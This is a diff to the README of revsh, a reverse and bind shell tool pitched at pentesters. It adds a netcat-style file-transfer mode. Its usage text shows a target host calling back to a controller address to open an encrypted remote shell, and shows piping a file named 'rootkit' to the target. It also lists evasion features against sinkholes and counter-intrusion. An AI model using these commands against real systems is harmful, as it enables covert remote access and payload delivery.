@@ -31,6 +31,7 @@ In addition, _revsh_ also offers the following features:
  * [Cert pinning](http://en.wikipedia.org/wiki/Transport_Layer_Security#Certificate_pinning) for protection against [sinkholes](http://en.wikipedia.org/wiki/DNS_sinkhole) and [mitm](http://en.wikipedia.org/wiki/Man-in-the-middle_attack) counter-intrusion.
  * Connection timeout for remote process self-termination.
  * Randomized retry timers for non-predictable auto-reconnection.
+ * Netcat style non-interactive data brokering for file transfer.
 
 _revsh_ is intended as a supplementary tool for a [pentester's](http://en.wikipedia.org/wiki/Pentester) toolkit that provides the full set of terminal features across an encrypted tunnel. All together in a small (~50k) easy to use binary.
 
@@ -45,32 +46,39 @@ _revsh_ was developed on x86_64 Linux. Here is a brief list of Arch / OS combina
 
 ## Usage ##
 
-    empty@monkey:~$ revsh -h
-
-    usage: revsh [-c [-a] [-s SHELL] [-d KEYS_DIR] [-f RC_FILE]] [-b [-k]] [-t SEC] [-r SEC1[,SEC2]] [ADDRESS:PORT]
-    
-    -c            Run in controller mode.                        (Default is target mode.)
-    -a            Enable Anonymous Diffie-Hellman mode.          (Default is "!ADH:DHE-RSA-AES256-SHA".)
-    -s SHELL      Invoke SHELL as the remote shell.              (Default is "/bin/bash".)
-    -d KEYS_DIR   Reference the keys in an alternate directory.  (Default is ".revsh/keys/".)
-    -f RC_FILE    Reference an alternate rc file.                (Default is ".revsh/rc".)
-    -t SEC        Set the connection timeout to SEC seconds.     (Default is "3600".)
-    -r SEC1,SEC2  Set the retry time to be SEC1 seconds, or      (Default is "600,1200".)
-                  to be random in the range from SEC1 to SEC2.
-    -b            Start in bind shell mode.                      (Default is reverse shell mode.)
-    -k            Start the bind shell in keep-alive mode.       (Ignored in reverse shell mode.)
-    -h            Print this help.
-    ADDRESS:PORT  The address and port of the listening socket.  (Default is "127.0.0.1:9999".)
- 
-    Notes:
-      * The -b flag must be invoked on both the control and target hosts to enable bind shell mode.
-      * Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.
- 
-    Example:
-      local controller host:  revsh -c 192.168.0.42:443
-      remote target host:     revsh 192.168.0.42:443
-
-
+	empty@monkey:~$ revsh -h
+	
+	usage:  revsh [-c [-a] [-s SHELL] [-d KEYS_DIR] [-f RC_FILE]] [-t SEC] [-r SEC1[,SEC2]] [-b [-k]] [-n] [-v] [ADDRESS:PORT]
+	
+		-c            Run in controller mode.                        (Default is target mode.)
+		-a            Enable Anonymous Diffie-Hellman mode.          (Default is "!ADH:DHE-RSA-AES256-SHA".)
+		-s SHELL      Invoke SHELL as the remote shell.              (Default is "/bin/bash".)
+		-d KEYS_DIR   Reference the keys in an alternate directory.  (Default is "~/.revsh/keys/".)
+		-f RC_FILE    Reference an alternate rc file.                (Default is "~/.revsh/rc".)
+		-t SEC        Set the connection timeout to SEC seconds.     (Default is "3600".)
+		-r SEC1,SEC2  Set the retry time to be SEC1 seconds, or      (Default is "600,1200".)
+		              to be random in the range from SEC1 to SEC2.
+		-b            Start in bind shell mode.                      (Default is reverse shell mode.)
+		-k            Start the bind shell in keep-alive mode.       (Ignored in reverse shell mode.)
+		-n            Netcat style data broker. No tty.              (Default is interactive w/remote tty.)
+		              Non-interactive. Useful for copying files.
+		-v            Verbose output.
+		-h            Print this help.
+		ADDRESS:PORT  The address and port of the listening socket.  (Default is "127.0.0.1:9999".)
+		
+		Notes:
+		  * The -b flag must be invoked on both the control and target hosts to enable bind shell mode.
+		  * Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.
+	    * Verbose output may mix with data if -v is used together with -n.
+		
+		Interactive example:
+		  local controller host:  revsh -c 192.168.0.42:443
+		  remote target host:     revsh 192.168.0.42:443
+		
+		Non-interactive example:
+		  local controller host:  cat ~/bin/rootkit | revsh -n -c 192.168.0.42:443
+		  remote target host:     revsh 192.168.0.42:443 > ./totally_not_a_rootkit
+		
 
 ## Example ##
 
